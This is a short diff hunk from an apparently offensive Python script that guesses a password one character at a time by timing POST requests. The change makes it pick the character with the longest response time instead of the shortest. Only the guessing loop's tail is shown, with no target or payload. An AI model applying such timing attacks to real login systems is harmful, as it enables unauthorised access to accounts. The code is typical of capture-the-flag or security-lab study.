@@ -21,6 +21,6 @@ for c in pass_charset:
     res = session.post(URL, data=payload)
     time_list.append(res.elapsed.total_seconds())
 
-print("guessed char: {}".format(pass_charset[time_list.index(min(time_list))]))
+print("guessed char: {}".format(pass_charset[time_list.index(max(time_list))]))
 
 
